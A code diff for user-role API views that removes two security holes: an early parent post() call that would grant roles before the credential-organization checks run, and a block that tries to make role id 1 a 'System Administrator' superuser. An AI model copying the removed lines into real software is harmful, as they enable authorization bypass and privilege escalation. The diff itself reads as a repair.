@@ -1079,7 +1079,7 @@ class UserTeamsList(SubListAPIView):
 
 
 class UserRolesList(SubListAttachDetachAPIView):
-    # view of the roles that a user has associated with their id
+
     model = models.Role
     serializer_class = serializers.RoleSerializerWithParentAccess
     metadata_class = RoleMetadata
@@ -1099,7 +1099,6 @@ class UserRolesList(SubListAttachDetachAPIView):
         ).exclude(content_type=content_type, object_id=u.id)
 
     def post(self, request, *args, **kwargs):
-        ret = super(UserRolesList, self).post(request, *args, **kwargs)
         sub_id = request.data.get('id', None)
         if not sub_id:
             return super(UserRolesList, self).post(request)
@@ -1108,7 +1107,6 @@ class UserRolesList(SubListAttachDetachAPIView):
         role = get_object_or_400(models.Role, pk=sub_id)
 
         credential_content_type = ContentType.objects.get_for_model(models.Credential)
-
         if role.content_type == credential_content_type:
             if 'disassociate' not in request.data and role.content_object.organization and user not in role.content_object.organization.member_role:
                 data = dict(msg=_("You cannot grant credential access to a user not in the credentials' organization"))
@@ -1117,10 +1115,7 @@ class UserRolesList(SubListAttachDetachAPIView):
             if not role.content_object.organization and not request.user.is_superuser:
                 data = dict(msg=_("You cannot grant private credential access to another user"))
                 return Response(data, status=status.HTTP_400_BAD_REQUEST)
-        if request.data.get('id', None) == 1:
-            request.data['role_field'] = "System Administrator"
-            request.data["is_superuser"] = True
-        # this won't work because it doesn't impact the user model, which is where `is_superuser` is found and is what needs to be changed
+
 
         return super(UserRolesList, self).post(request, *args, **kwargs)
 
@@ -4364,7 +4359,7 @@ class RoleDetail(RetrieveAPIView):
 
 
 class RoleUsersList(SubListAttachDetachAPIView):
-    # view of all the users that are within a role
+
     model = models.User
     serializer_class = serializers.UserSerializer
     parent_model = models.Role
